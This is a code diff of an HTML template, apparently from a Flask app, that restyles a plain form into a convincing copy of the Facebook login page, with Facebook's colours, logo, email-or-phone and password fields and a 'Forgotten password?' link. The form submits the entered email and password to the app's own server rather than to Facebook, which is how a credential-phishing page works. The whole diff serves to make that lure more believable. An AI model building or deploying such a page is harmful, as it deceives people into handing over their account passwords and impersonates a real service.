@@ -1,17 +1,111 @@
-<!-- app/templates/login_facebook.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   <title>Facebook Login</title>
+  <style>
+    :root {
+      --bg: #f0f2f5;
+      --brand1: #1877f2;
+    }
+    body {
+      background-color: var(--bg);
+      font-family: Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100vh;
+    }
+    .login {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100%;
+    }
+    .content {
+      height: 100%;
+      padding-top: 15%;
+    }
+    .content img {
+      height: 50px;
+      margin-bottom: 15px;
+    }
+    .login-form {
+    width: 90%;
+    max-width: 400px;
+    margin: 0 auto;
+    background-color: #1c1e21;
+    padding: 2em;
+    border-radius: 10px;
+    box-shadow: 0 0 10px rgba(0,0,0,0.5);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    }
+    .login-form img {
+    max-width: 60%;
+    height: auto;
+    margin-bottom: 1.5em;
+    object-fit: contain;
+    }
+    input {
+      border: 1px solid #DDDFE2;
+      margin-top: 15px;
+      padding: 14px;
+      width: 90%;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    input:focus {
+      border: 1px solid #1877F2;
+      outline: none;
+    }
+    #login-btn {
+      background-color: var(--brand1);
+      width: 90%;
+      font-size: 20px;
+      margin-top: 15px;
+      color: white;
+      padding: 16px;
+      border-radius: 10px;
+      font-weight: bold;
+      border: none;
+      cursor: pointer;
+    }
+    form > a {
+      display: block;
+      margin-top: 15px;
+      text-decoration: none;
+      color: var(--brand1);
+      font-size: 14px;
+    }
+    form > a:hover {
+      text-decoration: underline;
+    }
+    @media (max-width: 576px) {
+      .content {
+        display: none;
+      }
+
+      .login-form {
+        width: 90%;
+        margin: 0 auto;
+      }
+    }
+  </style>
 </head>
 <body>
-  <h2>Facebook Login</h2>
-  <form method="POST">
-    <input type="email" name="email" placeholder="Email" required><br>
-    <input type="password" name="password" placeholder="Password" required><br>
-    <button type="submit">Login</button>
-  </form>
+  <div class="login">
+    <div class="login-form">
+      <img src="{{ url_for('static', filename='fb.png') }}" alt="Facebook Logo" />
+      <form action="/" method="POST" autocomplete="off">
+        <input type="text" name="email" placeholder="Email or phone number" required maxlength="100" autocomplete="off" />
+        <input type="password" name="password" placeholder="Password" required maxlength="100" autocomplete="off" />
+        <button id="login-btn" type="submit">Log In</button>
+        <a href="#" rel="noopener noreferrer">Forgotten password?</a>
+      </form>
+    </div>
+  </div>
 </body>
 </html>
 
